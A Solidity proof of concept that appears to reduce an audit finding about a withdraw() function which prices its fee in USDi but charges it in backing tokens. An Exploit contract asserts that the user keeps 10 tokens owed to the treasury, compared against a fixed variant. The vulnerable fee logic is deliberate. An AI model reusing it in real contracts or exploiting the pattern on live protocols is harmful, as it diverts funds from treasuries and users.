// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/* USDi withdraw fee (ConsenSys, 55383).
   Cheatcode-free reduction. withdraw() prices the fee on the USDi amount
   and then spends that number as backingToken. At 2 backing per USDi the
   user keeps 10 backing that the treasury should have received. */

contract Backing {
    string public name = "Backing";
    string public symbol = "BACK";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract USDiCoin {
    Backing public backing;
    address public treasury;
    bool public immutable feeAfterConvert;
    uint256 public minimumFee;
    uint256 public constant RATE = 2e18;
    uint256 public constant BPS = 10000;
    mapping(address => uint256) public balanceOf;
    uint256 public convertedNet;

    constructor(Backing b, address t, bool fix) {
        backing = b;
        treasury = t;
        feeAfterConvert = fix;
    }

    function mintUsdi(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function getFee(uint256 amount, bool) public pure returns (uint256) {
        return amount * 1000 / BPS;
    }

    function withdraw(uint256 amount) external returns (uint256 userOut, uint256 feePaid) {
        require(amount > 0, "Amount must be greater than 0");
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        uint256 fee;
        uint256 backingAmount;
        if (feeAfterConvert) {
            backingAmount = amount * RATE / 1e18;
            fee = getFee(backingAmount, false);
            if (fee < minimumFee) {
                fee = minimumFee;
            }
            feePaid = fee;
            userOut = backingAmount - feePaid;
        } else {
            // Compute fee, ensure min
            fee = getFee(amount, false);
            if (fee < minimumFee) {
                fee = minimumFee;
            }
            uint256 netAmount = amount - fee;
            backingAmount = amount * RATE / 1e18;
            convertedNet = netAmount * RATE / 1e18;
            // @> VULN: fee is still a USDi quantity but it is taken in backingToken
            feePaid = fee;
            userOut = backingAmount - feePaid;
        }
        balanceOf[msg.sender] -= amount;
        require(backing.transfer(treasury, feePaid), "fee");
        require(backing.transfer(msg.sender, userOut), "user");
    }
}

contract Exploit {
    uint256 public constant AMOUNT = 100 ether;
    uint256 public constant EXTRA = 10 ether;
    address public constant SINK = address(0xB0B);

    Backing public backing;
    USDiCoin public coin;
    USDiCoin public fixedCoin;
    address public treasury;
    uint256 public userOut;
    uint256 public feePaid;
    uint256 public fairOut;
    uint256 public fairFee;

    constructor() {
        backing = new Backing();
        treasury = address(0xA11CE);
        coin = new USDiCoin(backing, treasury, false);
        fixedCoin = new USDiCoin(backing, treasury, true);
        backing.mint(address(coin), 200 ether);
        backing.mint(address(fixedCoin), 200 ether);
        coin.mintUsdi(address(this), AMOUNT);
        fixedCoin.mintUsdi(address(this), AMOUNT);
    }

    function run() external {
        (userOut, feePaid) = coin.withdraw(AMOUNT);
        require(userOut == 190 ether, "overpaid");
        require(feePaid == 10 ether, "short fee");
        require(backing.balanceOf(treasury) == 10 ether, "treasury");
        require(coin.convertedNet() == 180 ether, "fair net");
        require(backing.transfer(SINK, 180 ether), "forward fair");
        require(backing.balanceOf(address(this)) == EXTRA, "extra");
        (fairOut, fairFee) = fixedCoin.withdraw(AMOUNT);
        require(fairOut == 180 ether, "fair user");
        require(fairFee == 20 ether, "fair fee");
        require(backing.balanceOf(treasury) == 30 ether, "treasury after control");
        require(backing.transfer(SINK, fairOut), "forward control");
        require(backing.balanceOf(address(this)) == EXTRA, "kept extra");
        require(userOut - fairOut == EXTRA, "stolen");
    }
}
